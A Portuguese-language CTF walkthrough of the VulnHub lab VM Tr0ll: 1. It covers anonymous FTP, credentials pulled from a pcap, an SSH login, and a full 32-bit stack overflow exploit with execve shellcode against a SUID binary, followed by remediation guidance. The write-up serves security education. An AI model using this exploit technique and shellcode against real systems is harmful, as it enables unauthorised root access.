# Tr0ll: 1 — A Internet É Perigosa. Segura Esse PCAP Aqui.

( ͡° ͜ʖ ͡°) Olha rapaziada!! Tr0ll 1 é a VM que ensinou uma geração de jogadores de CTF o que significa ser enganado de propósito. A máquina está cheia de mecânicas de troll: um caminho `/secret` que só diz "lol nope", usuários decoy em `/etc/passwd`, e ciladas em cada canto. Mas por baixo do trolling existem vulnerabilidades reais: FTP anônimo expondo uma captura de rede, credenciais SSH em texto claro dentro dessa captura, e um binário SUID vulnerável a um clássico estouro de pilha 32-bit. Sem ASLR, sem NX, sem canário. Só vibes e shellcode. Respeito total ao maleus por criar toda a série Tr0ll. gg véi.

| Campo | Valor |
|---|---|
| **Nível** | Fácil/Iniciante |
| **VM Alvo** | Tr0ll: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tr0ll-1,100/ |
| **Técnicas** | Enumeração de serviços Nmap, acesso FTP anônimo, extração de credencial de PCAP/Wireshark, login SSH, descoberta de binário SUID, estouro de pilha 32-bit (sem mitigações), injeção de shellcode |
| **CVEs** | CWE-284 (Acesso FTP anônimo com exposição de credencial), CWE-121 (Estouro de Pilha em binário SUID), CWE-693 (Mitigações de segurança ausentes: sem ASLR/NX/canário) |
| **Grupos APT** | APT28 (Fancy Bear): usa serviços de rede expostos e credenciais em texto claro em arquivos de captura como vetor de acesso inicial em intrusões direcionadas; FIN7: aproveita exposição de FTP anônimo para coleta de credenciais em campanhas de pré-ransomware |

---

## Resumo do Ataque

```
nmap → FTP (21, anônimo), SSH (22), HTTP (80)
  → HTTP robots.txt → /secret → "lol nope" (cilada)
  → FTP anônimo → download de lol.pcap
  → strings lol.pcap / Wireshark → USER overflow, PASS Pass.txt
  → SSH overflow:Pass.txt → uid=1002(overflow)
  → find -perm -4000 → /var/www/html/sup3rs3cr3tdirlol/r00t (SUID)
  → GDB: offset 268 bytes → sobrescrita de EIP
  → shellcode em NOP sled → uid=0(root)
  → cat /root/proof.txt → 702a8c18d29c6f3ca0d99ef5712bfbdc
```

---

## Metodologia

1. Varredura completa de portas para identificar FTP, SSH e HTTP
2. Enumeração HTTP: robots.txt revela /secret (cilada)
3. Login FTP anônimo e download de lol.pcap
4. Análise do PCAP para extrair credenciais FTP em texto claro
5. Login SSH com credenciais extraídas
6. Descoberta de binário SUID via comando find
7. Identificação do offset de estouro de pilha com GDB
8. Injeção de shellcode via NOP sled para shell root
9. Captura da flag de root

---

## Passo 1 — Descoberta do Host e Varredura Completa de Portas

```bash
nmap -sn 192.168.56.0/24
# Alvo: 192.168.56.101 (ajuste para sua sub-rede)

nmap -sV -A -p- 192.168.56.101
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx  1 1000  0  8068 Aug 10 2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2
80/tcp open  http    Apache httpd 2.4.7
| http-robots.txt: 1 disallowed entry
|_/secret
```

Três superfícies de ataque. FTP é imediatamente interessante: login anônimo permitido e um arquivo `.pcap` visível diretamente no scan do Nmap. Sempre rode `-sV` e `-sC` juntos para que scripts NSE como `ftp-anon` sejam disparados automaticamente.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração HTTP (Atenção: Cilada!)

```bash
curl -s http://192.168.56.101/robots.txt
# Disallow: /secret

curl -s http://192.168.56.101/secret/
# → "lol nope"
```

O caminho `/secret` é misdirecionamento intencional. Visite, confirme que é beco sem saída, siga em frente. Não perca tempo com isso. A máquina se chama Tr0ll por um motivo.

**Nota sobre o mundo real:** Atores de ameaça e criadores de CTF igualmente usam caminhos de misdirecionamento. Em ambientes reais, caminhos sem saída desperdiçam o tempo de respondentes a incidentes. A disciplina de reconhecer e deixar para lá ciladas rapidamente é uma habilidade profissional genuína.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — FTP Anônimo e Download do PCAP

```bash
ftp 192.168.56.101
# Connected to 192.168.56.101.
# 220 (vsFTPd 3.0.2)
# Name (192.168.56.101:kali): anonymous
# Password: (Enter)
# 230 Login successful.

ftp> ls -la
ftp> get lol.pcap
ftp> bye
```

`lol.pcap` é uma captura de rede de 8KB. O nome é o primeiro troll: "lol" parece trivial mas contém as credenciais que precisamos.

**Nota sobre o mundo real:** FTP anônimo com arquivos legíveis globalmente é uma configuração crítica incorreta. Arquivos de captura de rede (`.pcap`, `.cap`, `.pcapng`) armazenados em servidores acessíveis são alvos de alto valor: frequentemente contêm credenciais em texto claro, tokens de sessão e comunicação interna. APT28 e FIN7 ambos usam enumeração FTP como parte de recon automatizado de pré-ataque.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1078.002 — Contas Válidas: Contas de Domínio

---

## Passo 4 — Análise do PCAP: Extração de Credenciais

Abordagem rápida com strings:

```bash
strings lol.pcap | grep -iE "user|pass|login"
# → USER overflow
# → PASS Pass.txt
```

Abordagem detalhada com Wireshark: abra `lol.pcap`, filtre `ftp`, siga qualquer fluxo TCP. A sessão FTP mostra claramente:

```
220 (vsFTPd 3.0.2)
USER overflow
331 Please specify the password.
PASS Pass.txt
230 Login successful.
```

Credenciais: `overflow` / `Pass.txt`

Atenção: a senha é literalmente a string `Pass.txt`, não uma referência a um arquivo. Esse é mais um troll: o nome parece um nome de arquivo mas é a senha real.

**MITRE ATT&CK:** T1040 — Sniffing de Rede; T1552.001 — Credenciais Não Seguras: Credenciais em Arquivos

---

## Passo 5 — Login SSH como overflow

```bash
ssh overflow@192.168.56.101
# Senha: Pass.txt

overflow@Tr0ll:~$ id
# uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

Shell obtido. Observe a lista de usuários decoy em `/etc/passwd`: troll, maleus, genphlux, wytshadow, lololol, ps-aux, felux, Eagle11, usmc8892, blawrg, vis1t0r. A maioria é pura isca de troll. Apenas `overflow` é acessível.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1078 — Contas Válidas

---

## Passo 6 — Descoberta de Binário SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Procure um binário SUID não padrão. Também enumere a raiz HTTP para diretórios ocultos:

```bash
ls -la /var/www/html/
# → sup3rs3cr3tdirlol/ (diretório oculto na raiz web)

ls -la /var/www/html/sup3rs3cr3tdirlol/
# -rwsr-xr-x 1 root root 8401 Aug 10 2014 r00t
```

O binário `r00t` tem SUID root configurado. Teste-o:

```bash
/var/www/html/sup3rs3cr3tdirlol/r00t AAAA
# → AAAA
# (ecoa o argumento, padrão strcpy vulnerável)
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1548.001 — Setuid e Setgid

---

## Passo 7 — Buffer Overflow: Encontrar Offset do EIP com GDB

```bash
gdb -q /var/www/html/sup3rs3cr3tdirlol/r00t

(gdb) run $(python -c "print 'A'*268 + 'B'*4 + 'C'*16")
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()
# EIP = 0x42424242 (BBBB), offset é 268 bytes

(gdb) info registers esp
# esp: 0xbffffb50
# Fora do GDB o ESP real é aproximadamente 0xbffffb90 (GDB adiciona overhead de env)
```

Offset de sobrescrita do EIP: **268 bytes**

**MITRE ATT&CK:** T1203 — Exploração para Execução no Cliente; T1068 — Exploração para Escalação de Privilégios

---

## Passo 8 — Exploit de Buffer Overflow: Injeção de Shellcode

Shellcode Linux x86 `execve("/bin/sh")` (19 bytes):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Estrutura: 268 bytes de padding + 4 bytes de endereço de retorno (apontando para o NOP sled) + 16 bytes de NOP sled + shellcode

```bash
/var/www/html/sup3rs3cr3tdirlol/r00t $(python -c \
  'print "A"*268 + "\x90\xfb\xff\xbf" + "\x90"*16 + \
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

```
# id
uid=1002(overflow) gid=1002(overflow) euid=0(root) groups=0(root),1002(overflow)
# whoami
root
```

Se o exploit travar, ajuste o endereço de retorno em incrementos de 8-16 bytes em qualquer direção. O NOP sled fornece margem.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Passo 9 — Flag de Root

```bash
cat /root/proof.txt
```

```
Good job, you did it!

702a8c18d29c6f3ca0d99ef5712bfbdc
```

(☞ﾟヮﾟ)☞ Root. Mandou bem mano, sem choro!

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | `overflow:Pass.txt` | lol.pcap (FTP anônimo) | Login SSH |
| Flag root | `702a8c18d29c6f3ca0d99ef5712bfbdc` | /root/proof.txt | Conclusão do desafio |
| Binário SUID | `/var/www/html/sup3rs3cr3tdirlol/r00t` | find -perm -4000 | Buffer overflow privesc |
| Offset BOF | 268 bytes até o EIP | Análise com GDB | Construção do exploit |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | FTP anônimo expondo captura de rede | Arquivos PCAP contêm credenciais em texto claro; FTP anônimo é uma configuração crítica incorreta (CIS Control 4) | Desative FTP anônimo; nunca armazene capturas de rede em servidores de acesso público |
| 2 | Credenciais em texto claro no PCAP | Wireshark extrai trivialmente credenciais de FTP, HTTP, SMTP, Telnet não criptografados | Substitua FTP por SFTP; aplique TLS em todo lugar; nunca use protocolos em texto claro para autenticação |
| 3 | Binário SUID compilado sem mitigações | Binários sem ASLR/NX/canário são trivialmente exploráveis com sobrescritas clássicas de endereço de retorno | Compile com -fstack-protector-all; habilite ASLR; marque pilha como NX |
| 4 | Binário SUID customizado na raiz web | Expor um binário SUID via raiz web é uma vulnerabilidade dupla: descoberta via FTP/web + execução direta | Nunca coloque binários SUID em diretórios web-acessíveis; minimize a contagem total de binários SUID |
| 5 | Contas de usuário decoy como misdirecionamento | Atores de ameaça reais também criam contas decoy para persistência e confusão de atribuição | Audite /etc/passwd regularmente; alerte sobre criação inesperada de contas de usuário |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Coleta | Coleta | Sniffing de Rede | T1040 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras: Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Escalação de Privilégios | Escalação de Privilégios | Setuid e Setgid | T1548.001 |
| Execução | Execução | Exploração para Execução no Cliente | T1203 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desative FTP anônimo**: `anonymous_enable=NO` no vsftpd.conf; migre para SFTP com autenticação por chave
2. **Nunca armazene arquivos PCAP em servidores FTP**: capturas de rede pertencem a armazenamento seguro e autenticado apenas
3. **Compile binários SUID com mitigações completas**: `-fstack-protector-all`, PIE (`-pie -fPIE`), pilha não executável
4. **Habilite ASLR em todo o sistema**: `echo 2 > /proc/sys/kernel/randomize_va_space`; persista em `/etc/sysctl.conf`
5. **Minimize binários SUID**: audite com `find / -perm -4000 -type f`; remova SUID de qualquer binário não essencial
6. **Substitua FTP por SFTP**: toda transferência de arquivo deve usar canais criptografados e autenticados

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todos os serviços FTP; audite binários SUID trimestralmente |
| Proteger | Controle de Acesso | Desative FTP anônimo; restrinja permissões do sistema de arquivos |
| Proteger | Segurança de Dados | Nunca armazene capturas/credenciais em servidores acessíveis; aplique criptografia |
| Detectar | Anomalias e Eventos | Alerte sobre logins FTP anônimos; monitore execução de SUID |
| Responder | Planejamento de Resposta | Desative FTP anônimo; rotacione credenciais expostas imediatamente |
| Recuperar | Planejamento de Recuperação | Reconstrua host comprometido; audite todo conteúdo acessível via FTP |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Desative acesso FTP anônimo |
| AC-6 | Menor Privilégio | Remova SUID de todos os binários não essenciais |
| CM-7 | Funcionalidade Mínima | Desative FTP anônimo; restrinja conteúdo da raiz web |
| IA-5 | Gerenciamento de Autenticador | Substitua credenciais FTP por pares de chaves SFTP |
| SC-8 | Confidencialidade de Transmissão | Substitua FTP por SFTP; aplique TLS para todos os serviços |
| SI-16 | Proteção de Memória | Habilite ASLR, NX; compile com protetor de pilha |

### CISA KEV

FTP anônimo com exposição de arquivos sensíveis mapeia diretamente para a orientação do Aviso CISA AA21-131A sobre proteção de serviços de transferência de arquivos. A CISA recomenda explicitamente desativar FTP anônimo e substituir por SFTP como ação de remediação de Prioridade 1.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (desativar FTP anônimo)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (ASLR, NX, canário de pilha)
- **D3-NTA** — Análise de Tráfego de Rede (detectar transmissão de credencial FTP em texto claro)

---

## Considerações Finais

Tr0ll: 1 é um clássico genuíno. As mecânicas de troll são executadas com comprometimento: cada cilada é colocada para construir o hábito de não perseguir becos sem saída. A lição real é que por baixo do misdirecionamento, as vulnerabilidades são completamente banais: FTP anônimo, credenciais em texto claro num arquivo de captura, e um binário SUID sem mitigações. Isso não são casos extremos exóticos, esses são achados que aparecem em ambientes de produção reais todo ano.

O buffer overflow é uma introdução gentil à exploração de pilha x86: sem ASLR, sem NX, sem canário. Um NOP sled e 19 bytes de shellcode. Se você consegue resolver o Tr0ll 1, você tem a base para todos os desafios de BOF mais complexos que virão. Máquina top demais para os fundamentos. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
